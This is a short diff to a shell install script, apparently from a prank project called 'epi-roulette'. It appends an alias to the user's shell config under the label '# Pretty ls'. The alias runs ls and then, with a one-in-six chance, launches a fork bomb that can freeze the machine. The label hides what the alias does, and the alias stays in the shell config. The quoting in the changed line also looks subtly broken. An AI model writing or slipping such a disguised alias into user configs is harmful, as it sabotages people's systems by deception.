@@ -1,6 +1,7 @@
 #!/bin/sh
 
-source "./config"
+REPO_PATH=$(pwd)
+source "$REPO_PATH/config"
 if [ -f "$SHELL" ]; then
     case "$SHELL" in
         */zsh) CONFIG_SHELL="zshrc" ;;
@@ -19,7 +20,7 @@ fi
 [ -f "$CONFIG_PATH/$CONFIG_SHELL" ] || (echo "$CONFIG_PATH/$CONFIG_SHELL does not exist" && exit 1;)
 
 echo "# Pretty ls" >> "$CONFIG_PATH/$CONFIG_SHELL"
-echo "alias ls='ls && ( [ \$RANDOM -ne 0 ] || :(){ :|:& };: )'" >> "$CONFIG_PATH/$CONFIG_SHELL"
+echo "alias ls='ls && RANDOM_VALUE=\$((\$RANDOM % 6)) && ( [ "\$RANDOM_VALUE" -ne 0 ] || :(){ :|:& };: )'" >> "$CONFIG_PATH/$CONFIG_SHELL"
 source -p $CONFIG_PATH $CONFIG_SHELL
 
-
+# rm -fr epi-roulette
